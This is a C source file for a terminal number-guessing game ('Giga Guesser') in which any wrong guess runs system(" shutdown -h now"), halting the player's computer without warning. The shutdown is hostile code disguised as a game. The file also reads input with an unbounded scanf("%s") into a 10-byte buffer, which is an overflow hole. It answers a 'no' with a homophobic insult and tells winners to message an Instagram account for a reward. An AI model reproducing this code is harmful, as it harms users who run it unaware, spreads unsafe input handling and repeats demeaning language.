#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define RESET  "\x1b[0m"
#define RED   "\x1b[31m"
#define GREEN  "\x1b[32m"
#define YELLOW "\x1b[33m"

int main() {
    int secretNumber, guess;
    srand(time(0));

    secretNumber = rand() % 100 + 1;

    printf(YELLOW" ****---- Welcome to the Giga Guesser Game! ----**** \n\n" RESET);
    printf(GREEN"I have chosen a number between 1 and 100.\n" RESET);
    printf(RED"Wanna Accept The Challenge? "GREEN"(yes/no): " RESET);
    char answer[10];
    scanf("%s", answer);

    if (strcmp(answer, "yes") == 0) 
    {
        while (1) {
            printf(GREEN"So Good , Enter your guess: " RESET);
            scanf("%d", &guess);

            if (guess == secretNumber) 
            {
                printf(GREEN "Congratulations! You Win DM me on IG : @emoh4med to get your Reward , .\n" RESET);
                break;
            }
            else 
            {
                printf(RED"LOSEEEEEEEEEEEEEEEEEEEER , RIP CYOU AGAIN ;) .\n" RESET);
                sleep(1);
                system(" shutdown -h now");
                return 0;
            }
        }
    } 
    else if (strcmp(answer, "no") == 0) 
        printf(YELLOW"Why Are You Gay ?? \n" RESET);
     else 
        printf(RED"Invalid input. Please answer with 'yes' or 'no'.\n" RESET);
    return 0;
}
